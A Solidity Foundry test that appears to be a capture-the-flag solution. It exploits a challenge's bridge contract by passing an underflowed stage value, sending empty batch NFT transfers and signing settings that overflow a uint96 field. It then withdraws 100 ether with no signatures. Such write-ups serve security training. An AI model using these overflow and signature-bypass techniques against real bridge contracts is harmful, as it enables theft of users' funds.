// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";
import "../src/Challenge.sol";

contract SolutionTest is Test {
    using ECDSA for bytes;
    using ECDSA for bytes32;


    Challenge challenge;
    uint256 playerPK;
    address player;
    function setUp() public {
        playerPK = 0x1337;
        player = vm.addr(playerPK);

        deal(address(this), 100 ether);
        challenge = new Challenge{value: 100 ether}(player);
    }

    function onERC1155Received(
        address,
        address from,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC1155Received.selector;
    }


    function test_solution() public {
        challenge.solveStage1(6);
        challenge.solveStage2(59, 101);
        unchecked{
            challenge.solveStage3(2, 1, uint(0) - uint(6));
        }

        vm.startPrank(player);
        challenge.BRIDGE().verifyChallenge();
        
        assertEq(challenge.challengeSolved(), true);

        uint256[] memory ids = new uint256[](201);
        uint256[] memory amounts = new uint256[](201);

        challenge.ADMIN_NFT().safeBatchTransferFrom(player, address(challenge.BRIDGE()), ids, amounts, "");

        bytes memory message = abi.encode(address(challenge), address(challenge.ADMIN_NFT()), uint256(type(uint96).max) + 1);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPK, message.toEthSignedMessageHash());

        bytes memory signature = abi.encodePacked(r, s, v);

        bytes[] memory signatures = new bytes[](1);
        signatures[0] = signature;
        challenge.BRIDGE().changeBridgeSettings(message, signatures);

        challenge.BRIDGE().withdrawEth(bytes32(uint(1)), new bytes[](0), player, 100 ether, "");

        assertEq(player.balance, 100 ether);
        vm.stopPrank();
    }
}

